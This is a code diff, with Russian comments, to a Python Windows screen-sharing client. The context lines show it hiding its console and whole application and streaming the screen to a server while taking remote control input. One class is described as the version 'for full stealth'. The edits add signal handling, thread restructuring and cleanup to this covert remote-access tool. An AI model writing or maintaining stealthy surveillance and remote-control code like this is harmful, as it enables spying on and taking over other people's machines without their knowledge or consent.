@@ -13,6 +13,8 @@ import sys
 import os
 import ctypes
 from ctypes import wintypes
+import signal
+import atexit
 
 class ScreenShareClient:
     def __init__(self):
@@ -20,6 +22,12 @@ class ScreenShareClient:
         self.running = False
         self.server_ip = None
         self.server_port = None
+        self.main_thread = None
+        
+        # Регистрируем обработчики для корректного завершения
+        signal.signal(signal.SIGINT, self.signal_handler)
+        signal.signal(signal.SIGTERM, self.signal_handler)
+        atexit.register(self.cleanup)
         
         # Скрываем консольное окно
         self.hide_console()
@@ -30,6 +38,12 @@ class ScreenShareClient:
             
         # Скрываем приложение полностью
         self.hide_application()
+        
+    def signal_handler(self, signum, frame):
+        """Обработчик сигналов для корректного завершения"""
+        print(f"Received signal {signum}, shutting down...")
+        self.cleanup()
+        sys.exit(0)
         
     def hide_console(self):
         """Скрывает консольное окно"""
@@ -173,15 +187,21 @@ class ScreenShareClient:
             return
             
         # Запускаем потоки
-        screen_thread = threading.Thread(target=self.send_screen)
-        screen_thread.daemon = True
+        screen_thread = threading.Thread(target=self.send_screen, daemon=True)
         screen_thread.start()
         
-        control_thread = threading.Thread(target=self.receive_control)
-        control_thread.daemon = True
+        control_thread = threading.Thread(target=self.receive_control, daemon=True)
         control_thread.start()
         
-        # Основной цикл
+        # Основной цикл в отдельном потоке
+        self.main_thread = threading.Thread(target=self.main_loop, daemon=True)
+        self.main_thread.start()
+        
+        # Ждем завершения основного потока
+        self.main_thread.join()
+            
+    def main_loop(self):
+        """Основной цикл приложения"""
         try:
             while self.running:
                 time.sleep(0.1)
@@ -194,7 +214,10 @@ class ScreenShareClient:
         """Очищает ресурсы"""
         self.running = False
         if self.socket:
-            self.socket.close()
+            try:
+                self.socket.close()
+            except:
+                pass
 
 # Альтернативная версия клиента без GUI (для полной скрытности)
 class SilentClient:
@@ -203,6 +226,12 @@ class SilentClient:
         self.running = False
         self.server_ip = None
         self.server_port = None
+        self.main_thread = None
+        
+        # Регистрируем обработчики для корректного завершения
+        signal.signal(signal.SIGINT, self.signal_handler)
+        signal.signal(signal.SIGTERM, self.signal_handler)
+        atexit.register(self.cleanup)
         
         # Получаем параметры подключения из аргументов командной строки
         if len(sys.argv) >= 3:
@@ -215,6 +244,11 @@ class SilentClient:
             # Если аргументы не переданы, используем значения по умолчанию
             self.server_ip = "127.0.0.1"
             self.server_port = 9999
+            
+    def signal_handler(self, signum, frame):
+        """Обработчик сигналов для корректного завершения"""
+        self.cleanup()
+        sys.exit(0)
             
     def connect_to_server(self):
         """Подключается к серверу"""
@@ -295,15 +329,21 @@ class SilentClient:
             return
             
         # Запускаем потоки
-        screen_thread = threading.Thread(target=self.send_screen)
-        screen_thread.daemon = True
+        screen_thread = threading.Thread(target=self.send_screen, daemon=True)
         screen_thread.start()
         
-        control_thread = threading.Thread(target=self.receive_control)
-        control_thread.daemon = True
+        control_thread = threading.Thread(target=self.receive_control, daemon=True)
         control_thread.start()
         
-        # Основной цикл
+        # Основной цикл в отдельном потоке
+        self.main_thread = threading.Thread(target=self.main_loop, daemon=True)
+        self.main_thread.start()
+        
+        # Ждем завершения основного потока
+        self.main_thread.join()
+            
+    def main_loop(self):
+        """Основной цикл приложения"""
         try:
             while self.running:
                 time.sleep(0.1)
@@ -316,7 +356,10 @@ class SilentClient:
         """Очищает ресурсы"""
         self.running = False
         if self.socket:
-            self.socket.close()
+            try:
+                self.socket.close()
+            except:
+                pass
 
 if __name__ == "__main__":
     # Выбираем тип клиента в зависимости от аргументов
